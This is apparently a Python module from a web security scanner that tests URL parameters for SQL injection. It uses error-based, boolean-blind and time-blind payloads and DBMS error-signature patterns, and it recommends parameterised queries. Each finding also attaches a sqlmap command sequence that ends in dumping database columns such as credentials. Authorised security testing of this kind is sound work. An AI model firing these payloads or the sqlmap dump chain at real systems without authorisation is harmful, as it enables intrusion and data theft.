"""
sqli_detect — SQL injection detection via three techniques: error-based, boolean-based
blind, and time-based blind.

For every parameter discovered by the shared crawl it tries, in increasing cost order:
  1. Error-based   — inject breaking payloads and match DBMS error signatures (high confidence).
  2. Boolean-based — compare a TRUE condition (response ≈ baseline) against a FALSE condition
                     (response differs); a consistent split is blind SQLi.
  3. Time-based    — inject a SLEEP/WAITFOR and confirm the delay scales with the requested time
                     (a 5s sleep is clearly longer than a 2s sleep), ruling out a slow endpoint.

This detects but never extracts data. Active probing is skipped in safe mode. Confirm hits
with a dedicated tool (sqlmap) on an authorised target.
"""
from __future__ import annotations

import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx
from loguru import logger

from scanner import evidence as ev
from scanner.engine import Finding, Severity, ScanEngine

MODULE = "sqli_detect"

_ERROR_PAYLOADS: list[tuple[str, str]] = [
    ("single_quote", "'"),
    ("double_quote", '"'),
    ("error_or",     "1' OR '1'='1"),
    ("comment",      "1'--"),
    ("paren",        "1')"),
]

# Boolean pairs: (true_condition, false_condition). {v} = original parameter value.
_BOOL_PAIRS: list[tuple[str, str]] = [
    ("{v} AND 1=1",            "{v} AND 1=2"),
    ("{v}' AND '1'='1",        "{v}' AND '1'='2"),
    ('{v}" AND "1"="1',        '{v}" AND "1"="2'),
]

# Time-based payloads per DBMS. {v}=value, {t}=seconds.
_TIME_PAYLOADS: list[tuple[str, str]] = [
    ("MySQL",      "{v}' AND SLEEP({t})-- -"),
    ("MySQL",      "{v} AND SLEEP({t})"),
    ("PostgreSQL", "{v}' AND (SELECT 1 FROM pg_sleep({t}))-- -"),
    ("MSSQL",      "{v}'; WAITFOR DELAY '0:0:{t}'-- -"),
    ("Generic",    "{v}' OR SLEEP({t})-- -"),
]

_TIME_LONG = 5
_TIME_SHORT = 2
_TIME_MAX_PARAMS = 8        # cap the (slow) time-based stage

_ERROR_RE = [(re.compile(p, re.IGNORECASE), label) for p, label in [
    (r"you have an error in your sql syntax",        "MySQL"),
    (r"mysql_fetch_|mysql_num_rows|warning: mysql",  "MySQL"),
    (r"ORA-[0-9]{4,5}|quoted string not properly",   "Oracle"),
    (r"SQLite3?::|sqlite_",                          "SQLite"),
    (r"pg_query\(\)|pg_exec\(\)|postgresql.*error",  "PostgreSQL"),
    (r"unterminated quoted string at or near",       "PostgreSQL"),
    (r"unclosed quotation mark after the character",  "MSSQL"),
    (r"microsoft.*odbc.*sql server|\[Microsoft\]\[ODBC", "MSSQL"),
    (r"SQLSTATE\[",                                  "PDO/Generic"),
    (r"DB2 SQL error|dynamic sql error",             "DB2/Firebird"),
]]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _inject(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


def _detect_error(text: str) -> str | None:
    for pattern, label in _ERROR_RE:
        if pattern.search(text):
            return label
    return None


def _similar(a: str, b: str, tol: float = 0.05) -> bool:
    la, lb = len(a), len(b)
    return abs(la - lb) / max(la, lb, 1) <= tol


def _get(engine: ScanEngine, url: str) -> httpx.Response | None:
    try:
        return engine.request("GET", url)
    except httpx.HTTPError as exc:
        logger.debug(f"sqli_detect: {url} → {exc}")
        return None


def _timed_get(engine: ScanEngine, url: str) -> float | None:
    start = time.monotonic()
    try:
        engine.request("GET", url)
    except httpx.HTTPError:
        return None
    return time.monotonic() - start


_SQLMAP_TECH = {"error-based": "E", "boolean-based blind": "B", "time-based blind": "T"}


def _evidence(param: str, payload: str, resp: "httpx.Response | None" = None,
              indicator: str = "") -> list[str]:
    """Proof lines for a SQLi finding: the injection point + the response/signal that confirmed it."""
    lines = [f"injected into URL parameter '{param}': {ev.note(payload)[:80]}"]
    if resp is not None:
        lines += ev.from_response(resp, indicator=indicator)
    elif indicator:
        lines.append(f"matched: {ev.note(indicator)}")
    return lines


def _exploitation_steps(url: str, param: str, flag: str) -> list[dict]:
    """The ordered sqlmap kill chain that weaponises a confirmed injection — from confirmation down to
    data exfiltration. The <database>/<table>/<columns> placeholders are filled in at runtime as each
    stage discovers names. Authorised targets only."""
    base = f'sqlmap -u "{url}" -p {param} --batch --technique={flag}'
    return [
        {"step": 1, "description": "Confirm the injection, fingerprint the DBMS, and list the databases.",
         "command": f"{base} --threads=10 --dbs"},
        {"step": 2, "description": "Enumerate the tables inside the target database.",
         "command": f"{base} -D <database> --tables"},
        {"step": 3, "description": "List the columns of the target table to locate the sensitive fields.",
         "command": f"{base} -D <database> -T <table> --columns"},
        {"step": 4, "description": "Dump the chosen columns to extract the data (e.g. credentials).",
         "command": f"{base} -D <database> -T <table> -C <columns> --dump"},
    ]


def _finding(url: str, param: str, technique: str, payload: str, db: str,
             evidence: list[str] | None = None) -> Finding:
    proof_url = _inject(url, param, payload)
    flag = _SQLMAP_TECH.get(technique, "BEUSTQ")
    sqlmap_args = ["-u", url, "-p", param, "--batch", f"--technique={flag}", "--threads=10", "--dbs"]
    sqlmap = f'sqlmap -u "{url}" -p {param} --batch --technique={flag} --threads=10 --dbs'
    steps = _exploitation_steps(url, param, flag)
    return Finding(
        module=MODULE,
        title=f"SQL Injection ({technique}): {param}" + (f" ({db})" if db else ""),
        description=(f"Parameter '{param}' in {url} is vulnerable to SQL injection via {technique} "
                     f"detection. Payload: {payload!r}." + (f" DBMS: {db}." if db else "")
                     + " An sqlmap exploitation walkthrough (authorised targets only) is attached below; "
                     "the clickable proof link replays the injected request in your browser."),
        severity=Severity.CRITICAL,
        recommendation=("Use parameterised queries / prepared statements everywhere; never concatenate "
                        "user input into SQL. Validate types and apply least-privilege DB accounts."),
        raw={"url": url, "parameter": param, "technique": technique, "payload": payload,
             "database": db, "proof_url": proof_url, "sqlmap": sqlmap,
             "sqlmap_args": sqlmap_args, "confidence": "high",
             "evidence": evidence or _evidence(param, payload), "exploitation": steps},
    )


# ---------------------------------------------------------------------------
# Per-parameter test (error → boolean → time)
# ---------------------------------------------------------------------------

def _test_param(engine: ScanEngine, url: str, param: str, allow_time: bool) -> Finding | None:
    orig = (parse_qs(urlparse(url).query, keep_blank_values=True).get(param) or ["1"])[0] or "1"

    # Baseline (clean request) — reused by the error and boolean stages.
    base = _get(engine, url)
    base_has_error = base is not None and _detect_error(base.text) is not None

    # 1. Error-based — the DBMS error must be INTRODUCED by our payload, not already present in the
    # clean response (a page that normally prints "SQL error ..." text would otherwise false-positive).
    if not base_has_error:
        for _name, payload in _ERROR_PAYLOADS:
            resp = _get(engine, _inject(url, param, payload))
            if resp and (db := _detect_error(resp.text)):
                return _finding(url, param, "error-based", payload, db,
                                _evidence(param, payload, resp,
                                          f"{db} SQL error signature appeared (absent in baseline)"))

    # 2. Boolean-based blind
    if base is not None:
        for true_t, false_t in _BOOL_PAIRS:
            rt = _get(engine, _inject(url, param, true_t.format(v=orig)))
            rf = _get(engine, _inject(url, param, false_t.format(v=orig)))
            if rt is not None and rf is not None:
                if _similar(rt.text, base.text) and not _similar(rf.text, base.text) \
                        and not _similar(rt.text, rf.text):
                    return _finding(
                        url, param, "boolean-based blind", true_t.format(v=orig), "",
                        _evidence(param, true_t.format(v=orig), rt,
                                  f"TRUE≈baseline ({len(rt.text)}B≈{len(base.text)}B) while "
                                  f"FALSE differs ({len(rf.text)}B) — blind boolean split"))

    # 3. Time-based blind
    if allow_time:
        baseline_t = _timed_get(engine, _inject(url, param, orig))
        if baseline_t is not None:
            for db, tmpl in _TIME_PAYLOADS:
                long_t = _timed_get(engine, _inject(url, param, tmpl.format(v=orig, t=_TIME_LONG)))
                if long_t is None or (long_t - baseline_t) < _TIME_LONG - 1.5:
                    continue
                # Confirm the delay scales with the requested sleep (rules out a slow endpoint).
                short_t = _timed_get(engine, _inject(url, param, tmpl.format(v=orig, t=_TIME_SHORT)))
                if short_t is not None and (long_t - short_t) >= (_TIME_LONG - _TIME_SHORT) - 1.5:
                    long_payload = tmpl.format(v=orig, t=_TIME_LONG)
                    return _finding(
                        url, param, "time-based blind", long_payload, db,
                        [f"injected into URL parameter '{param}': {ev.note(long_payload)[:80]}",
                         f"matched: {db} delay scales with sleep — {long_t:.1f}s (SLEEP {_TIME_LONG}) "
                         f"vs {short_t:.1f}s (SLEEP {_TIME_SHORT}) vs {baseline_t:.1f}s baseline"])
    return None


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(engine: ScanEngine) -> list[Finding]:
    if engine.is_safe_mode():
        logger.info("sqli_detect: safe mode — skipping active injection")
        return [Finding(MODULE, "SQL Injection Scan Skipped (Safe Mode)",
                        "Active SQLi probing was skipped because safe mode is enabled.",
                        Severity.INFO, "Re-run without safe mode on an authorised target.",
                        {"reason": "safe_mode", "confidence": "high"})]

    candidate_urls = list(engine.get_crawl().parametrised_urls)
    if urlparse(engine.url).query and engine.url not in candidate_urls:
        candidate_urls.insert(0, engine.url)

    if not candidate_urls:
        return [Finding(MODULE, "SQL Injection: No Parametrised URLs Found",
                        "No URLs with query parameters were discovered to test.",
                        Severity.INFO, "", {"scanned_url": engine.url, "confidence": "high"})]

    # One work item per unique parameter name (first URL that carries it).
    seen: set[str] = set()
    work: list[tuple[str, str]] = []
    for url in candidate_urls:
        for param in parse_qs(urlparse(url).query, keep_blank_values=True):
            if param not in seen:
                seen.add(param)
                work.append((url, param))

    findings: list[Finding] = []
    with ThreadPoolExecutor(max_workers=engine.threads) as pool:
        futures = {
            pool.submit(_test_param, engine, url, param, i < _TIME_MAX_PARAMS): (url, param)
            for i, (url, param) in enumerate(work)
        }
        for future in as_completed(futures):
            result = future.result()
            if result:
                findings.append(result)

    if not findings:
        return [Finding(MODULE, "SQL Injection: None Detected",
                        f"Tested {len(work)} parameter(s) with error-, boolean-, and time-based techniques. "
                        "No injection was detected.",
                        Severity.INFO, "", {"params_tested": len(work), "confidence": "high"})]
    return findings
